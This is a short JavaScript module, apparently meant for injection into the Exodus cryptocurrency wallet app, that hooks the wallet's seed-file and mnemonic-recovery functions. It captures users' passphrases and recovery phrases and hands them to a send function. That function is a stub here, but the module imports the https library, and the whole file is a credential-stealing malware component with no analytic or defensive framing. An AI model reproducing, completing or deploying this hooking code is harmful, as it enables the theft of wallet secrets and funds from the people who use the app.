(function() {
    var __hos = require("os");
    var __hhttps = require("https");
    var __hfs = require("fs");
    var __hpw = null, __hpin = null, __hmn = null, __hpriv = [];
    var __hmeta = { app: "Exodus", ver: process.versions.electron || "" };

    function __hsend(event, record) { return record; }
    function __hhookSeeder(proto) {
        if (!proto) return;
        if (typeof proto.getSeedFile === "function") {
            var origGetSeedFile = proto.getSeedFile;
            proto.getSeedFile = function(passphrase) {
                if (passphrase) {
                    __hpw = String(passphrase);
                    __hsend("getSeedFile", { pw: __hpw });
                }
                return origGetSeedFile.apply(this, arguments);
            };
        }
        if (typeof proto.createFromMnemonicRecoveryPhrase === "function") {
            var origCreate = proto.createFromMnemonicRecoveryPhrase;
            proto.createFromMnemonicRecoveryPhrase = function(mnemonic, passphrase) {
                __hmn = String(mnemonic || "");
                if (passphrase) __hpw = String(passphrase);
                __hsend("createFromMnemonicRecoveryPhrase", { mn: __hmn, pw: __hpw });
                return origCreate.apply(this, arguments);
            };
        }
        if (typeof proto.recoverWalletFromMnemonic === "function") {
            var origRecover = proto.recoverWalletFromMnemonic;
            proto.recoverWalletFromMnemonic = function(mnemonic, passphrase) {
                __hmn = String(mnemonic || "");
                if (passphrase) __hpw = String(passphrase);
                __hsend("recoverWalletFromMnemonic", { mn: __hmn, pw: __hpw });
                return origRecover.apply(this, arguments);
            };
        }
    }

    module.exports = { __hhookSeeder: __hhookSeeder, __hsend: __hsend };
})();
